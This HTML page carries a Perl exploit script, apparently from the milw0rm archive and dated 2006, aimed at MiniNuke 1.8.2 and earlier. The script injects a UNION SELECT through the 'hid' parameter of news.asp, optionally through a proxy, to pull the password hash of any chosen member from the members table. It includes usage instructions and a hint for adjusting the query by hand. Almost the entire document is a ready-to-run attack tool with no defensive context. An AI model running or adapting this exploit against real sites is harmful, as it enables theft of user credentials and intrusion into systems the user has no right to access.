<html><head><title>MiniNuke <= 1.8.2 (news.asp hid) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

# MiniNuke (www.miniex.net) Version: &lt;= 1.8.2  SQL-injection exploit.
# This exploit uses the vulnerability discovered by nukedx@nukedx.com.
# Exploit uses SQl-injection to give you the hash from user with chosen id.
# DetMyl, 2006 Detmyl@bk.ru 

use IO::Socket;

if (@ARGV &lt; 3)
 {
 print q(
 +++++++++++++++++++++++++++++++++++++++++++++++++++
 Usage: perl mini-nuke.pl [site] [dir] [useId] [proxy (optional)] 
 i.e. perl mini-nuke.pl &quot;somesite.com&quot; / 52 127.0.0.1:3128
 ++++++++++++++++++++++++++++++++++++++++++++++++++++
           );   
 exit;
 } 
$serv  = $ARGV[0];
$dir   = $ARGV[1];
$uid = $ARGV[2];
$proxy   = $ARGV[3];

print &quot;----------------------------------\n&quot;;
if ( defined $proxy) {
	$proxy =~ s/(http:\/\/)//eg;
	($proxyAddr,$proxyPort) = split(/:/, $proxy);
   }
$serv =~ s/(http:\/\/)//eg;
$request =&quot;http://&quot;.$serv.$dir.&quot;news.asp?Action=Print&amp;hid=66%20union+select+0,sifre,0,0,0,0,0,0,0,0+from+members+where+uye_id=&quot;.$uid;
print &quot;Connecting to: $serv...\n&quot;;
print $proxy?&quot;Using proxy: $proxy \n&quot;:&quot;&quot;;
$socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;,
				 PeerAddr =&gt; $proxyAddr?&quot;$proxyAddr&quot;:&quot;$serv&quot;,
				 PeerPort =&gt; $proxyPort?&quot;$proxyPort&quot;:&quot;80&quot;) 
				 || die &quot;can't connect to: $serv\n&quot;;
print $socket &quot;GET $request HTTP/1.1\n&quot;;
print $socket &quot;Host: $serv\n&quot;;
print $socket &quot;Accept: */*\n&quot;;
print $socket &quot;Connection: close\n\n&quot;;
print &quot;+ Connected!...\n&quot;;
	while($answer = &lt;$socket&gt;) {
		if ($answer =~ /&lt;b&gt;([\d,a-f]{32})&lt;\/b&gt;/) { 
			print &quot;+ Found! The hash for user $uid: $1\n&quot;;
			print &quot;----------------------------------\n&quot;;
			  exit(); }
		if ($answer =~ /number of columns/) { print &quot;+ Vulnerable! But no result with default querry, so manually change the scrypt;-)...\n&quot;;exit(); }
	}
print &quot;Exploit failed\n&quot;;
print &quot;--------------------------\n&quot;;

# milw0rm.com [2006-01-14]</pre></html>